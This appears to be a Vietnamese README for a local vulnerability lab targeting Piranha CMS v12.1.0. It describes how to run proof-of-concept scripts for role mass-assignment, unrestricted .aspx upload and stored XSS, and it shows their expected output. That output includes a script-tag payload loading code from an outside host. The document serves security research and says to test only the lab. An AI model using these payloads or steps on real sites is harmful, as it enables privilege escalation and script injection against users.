# 🧪 piranha.core v12.1.0 - Vulnerability Test Lab

Môi trường kiểm thử bảo mật cho **piranha.core v12.1.0**.
Chỉ sử dụng cho mục đích nghiên cứu bảo mật hợp pháp.

---

## 📁 Cấu trúc

```
test_vul/
├── piranha_lab/          # ASP.NET Core app (lab server)
│   ├── PiranhaLab.csproj
│   ├── Program.cs
│   ├── appsettings.json
│   └── editorconfig.json
├── repro_v001.py         # PoC: Role Mass-Assignment (CWE-915) [HIGH]
├── repro_v002.py         # PoC: Unrestricted File Upload (CWE-434) [MEDIUM]
├── repro_v003.py         # PoC: Stored XSS in Post Comments (CWE-79) [HIGH]
├── repro_piranha_xss.py  # PoC: Finalized Piranha CMS Stored XSS [CRITICAL]
└── README.md
```

---

## 🟣 Bước 4: Test V-003 / XSS - Stored XSS in Comments

Vulnerability này cho phép một user không định danh (unauthenticated) chèn mã script vào nội dung comment hoặc URL của comment.

```powershell
python repro_piranha_xss.py
```

### Kết quả mong đợi (VULNERABLE)
```
[✓] TARGETING: http://localhost:5000/blogtest/test123
[✓] SENDING XSS PAYLOAD...
[✓] VERIFYING PERSISTENCE...
[✓] VULNERABILITY CONFIRMED!
    Payload found in response: <script src='https://zerokit.io/x.js'></script>
RESULT: VULNERABLE ✓
```


---

## 🚀 Bước 1: Khởi động Lab Server

```powershell
# Chuyển vào thư mục lab
cd d:\WLD\SSI\research\1\trilm\ZeroKit2\test_vul\piranha_lab

# Restore packages và build từ repo local
dotnet run
```

> **Lưu ý**: Lần đầu chạy có thể mất vài phút để restore NuGet packages.
> Server sẽ lắng nghe tại `http://localhost:5000`

### Tài khoản mặc định (seeded tự động)
| Username | Password |
|---|---|
| `admin@piranhacms.org` | `password` |

Sau khi server chạy, truy cập `http://localhost:5000/manager` để xác nhận.

---

## 🔴 Bước 2: Test V-001 - Role Mass-Assignment

```powershell
# Trong terminal MỚI (giữ lab server chạy)
cd d:\WLD\SSI\research\1\trilm\ZeroKit2\test_vul

pip install requests urllib3
python repro_v001.py
```

### Kết quả mong đợi (VULNERABLE)
```
[✓] VULNERABILITY CONFIRMED!
    User 'xxx' was assigned role 'SysAdmin'
    without any server-side role validation.
RESULT: VULNERABLE ✓
```

### Xác minh thủ công
1. Vào `http://localhost:5000/manager` → Users
2. Kiểm tra user bị tấn công → roles đã bị thay đổi thành `SysAdmin`

---

## 🟡 Bước 3: Test V-002 - Unrestricted File Upload

```powershell
python repro_v002.py
```

### Kết quả mong đợi (VULNERABLE)
```
[✓] VULNERABILITY CONFIRMED!
    Server accepted 'zerokit_probe.aspx' without extension validation.
    File is WEB ACCESSIBLE at: http://localhost:5000/uploads/zerokit_probe.aspx
RESULT: VULNERABLE ✓
```

> Script sẽ **tự động dọn dẹp** file sau khi test xong.

---

## ⚠️ Lưu ý quan trọng

- **Chỉ test trên môi trường lab này** - không bao giờ test trên hệ thống production
- Các file probe đều **vô hại** - chỉ chứa comment text
- Lab sử dụng database SQLite (`piranha_lab.db`) - xóa file này để reset

---

## 🔧 Khắc phục lỗi thường gặp

| Lỗi | Giải pháp |
|---|---|
| `NuGet package not found` | Đảm bảo project trỏ vào source code piranha.core local, hoặc dùng NuGet online |
| `Login failed` | Đợi app seed xong (lần đầu khoảng 10-30 giây) |
| `XSRF token empty` | Script sẽ thử nhiều tên cookie. Xem DevTools để lấy thủ công |
| `Connection refused` | Lab server chưa chạy. Chạy `dotnet run` trước |
